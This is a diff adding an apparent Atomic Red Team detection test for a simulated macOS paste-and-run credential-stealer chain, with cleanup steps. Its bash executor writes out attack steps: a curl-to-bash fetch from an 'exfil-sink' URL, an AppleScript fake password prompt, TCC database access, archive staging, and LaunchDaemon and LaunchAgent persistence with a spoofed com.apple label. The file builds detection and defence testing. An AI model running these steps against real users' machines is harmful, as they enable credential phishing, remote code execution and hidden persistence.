@@ -1,0 +1,88 @@
+attack_technique: T1059.002
+display_name: AppleScript Credential Phish to Stealer
+atomic_tests:
+  - name: Paste-to-Stealer Chain (2026 macOS)
+    description: |
+      Simulates a 2026 paste-and-run macOS attack chain: AppleScript credential phish,
+      failed authentication attempt, staging of a collection folder (~/cs_sim_collect;
+      ~/Documents is TCC-protected and would prompt), download attempt to
+      exfil sink, a stealer binary dropped under ~/Library/Application Support that
+      reads a TCC database, and persistence via LaunchDaemon/LaunchAgent that run it.
+
+      Fidelity limits:
+      - Script Editor ClickFix GUI step not simulated (requires user click)
+      - Download goes to exfil sink URL (GET denied from VPC, so pipe runs nothing)
+      - Password dialog uses `giving up after 3` to avoid hanging
+      - The stealer is a cc-compiled stub (ad-hoc, linker-signed) that only opens and reads
+        the files named on its command line; it is not real malware
+      - The TCC database it reads is a test file at a path ending in
+        Library/Application Support/com.apple.TCC/TCC.db inside ~/cs_sim_collect: the real
+        one is TCC-protected and holds real grants
+      - All persistence plists are inert (RunAtLoad false, never loaded)
+
+      Expected telemetry: osascript exec with `hidden answer` in args, dscl authonly
+      exec plus an ESF authentication event (success:false), cc/ld execs and the stub's
+      creation in ~/Library/Application Support/cs_sim/bin, an ESF open of the TCC.db test
+      copy by the stub (uid 501), ditto archive creation, curl exec, sudo events,
+      LaunchDaemon/LaunchAgent file creation, and BTM launch item adds whose executable is
+      the stub in the home directory.
+
+      Falcon block status: not blocked (2026-11-12 14:47Z run; macOS 26.7, Falcon 8.10)
+
+      Prerequisite: Xcode Command Line Tools (`cc`). The Amazon macOS AMI has them; MacStadium images don't.
+    supported_platforms:
+      - macos
+    executor:
+      name: bash
+      elevation_required: false
+      command: |
+        set -e
+        xcode-select -p >/dev/null 2>&1 || { echo "prereq missing: Xcode Command Line Tools (cc)"; exit 1; }
+
+        # ~/Documents is TCC-protected: real AMOS triggers a consent prompt there, which blocks a headless run.
+        mkdir -p ~/cs_sim_collect || true
+        touch ~/cs_sim_collect/sim_test_doc.txt || true
+
+        # ClickFix order: the pasted one-liner fetches first; the password prompt, credential check and staging follow.
+        curl -s https://exfil-sink.nebulock.internal/stage | bash || true
+
+        osascript -e 'display dialog "macOS needs your password to continue." with icon caution default answer "" with hidden answer giving up after 3' || true
+
+        dscl . authonly "$(id -un)" wrong-password 2>/dev/null || true
+
+        # The stealer: a non-Apple binary dropped in the user's Library (a renamed Apple binary is killed by AMFI).
+        # It only reads the files named on its command line; the launch items below run it with none.
+        AGENT="$HOME/Library/Application Support/cs_sim/bin/cs_sim_agent"
+        printf '%s\n' '#include <fcntl.h>' '#include <unistd.h>' 'int main(int c, char **v) { char b[4096]; for (int i = 1; i < c; i++) { int fd = open(v[i], O_RDONLY); if (fd < 0) continue; while (read(fd, b, sizeof b) > 0) {} close(fd); } return 0; }' > /tmp/cs_sim_agent.c
+        cc -o /tmp/cs_sim_agent /tmp/cs_sim_agent.c
+        mkdir -p "$(dirname "$AGENT")"
+        cp /tmp/cs_sim_agent "$AGENT"
+
+        # A test copy of a TCC database (the real ~/Library one is TCC-protected): the rule matches on the path's ending.
+        TCC_COPY="$HOME/cs_sim_collect/Library/Application Support/com.apple.TCC/TCC.db"
+        mkdir -p "$(dirname "$TCC_COPY")"
+        echo "coresigma simulation test file, not a TCC database" > "$TCC_COPY"
+        "$AGENT" "$TCC_COPY"
+
+        rm -f /tmp/cs_stage.zip || true
+        ditto -c -k ~/cs_sim_collect /tmp/cs_stage.zip || true
+
+        # Both launch items run the stub from the home directory, as AMOS-lineage persistence does.
+        if sudo -n true 2>/dev/null; then
+          printf '%s\n' '<?xml version="1.0" encoding="UTF-8"?>' '<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">' "<plist version=\"1.0\"><dict><key>Label</key><string>io.nebulock.coresigma.sim</string><key>ProgramArguments</key><array><string>$AGENT</string></array><key>RunAtLoad</key><false/></dict></plist>" | sudo tee /Library/LaunchDaemons/io.nebulock.coresigma.sim.plist >/dev/null
+        fi
+
+        mkdir -p ~/Library/LaunchAgents || true
+        printf '%s\n' '<?xml version="1.0" encoding="UTF-8"?>' '<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">' "<plist version=\"1.0\"><dict><key>Label</key><string>com.apple.coresigma-sim</string><key>ProgramArguments</key><array><string>$AGENT</string></array><key>RunAtLoad</key><false/></dict></plist>" > ~/Library/LaunchAgents/com.apple.coresigma-sim.plist
+
+        echo "Paste-to-stealer chain complete"
+      cleanup_command: |
+        set -e
+        rm -f /tmp/cs_stage.zip /tmp/cs_sim_agent /tmp/cs_sim_agent.c
+        rm -rf ~/cs_sim_collect
+        rm -rf ~/"Library/Application Support/cs_sim"
+        if sudo -n true 2>/dev/null; then
+          sudo rm -f /Library/LaunchDaemons/io.nebulock.coresigma.sim.plist
+        fi
+        rm -f ~/Library/LaunchAgents/com.apple.coresigma-sim.plist
+        echo "Cleanup complete"
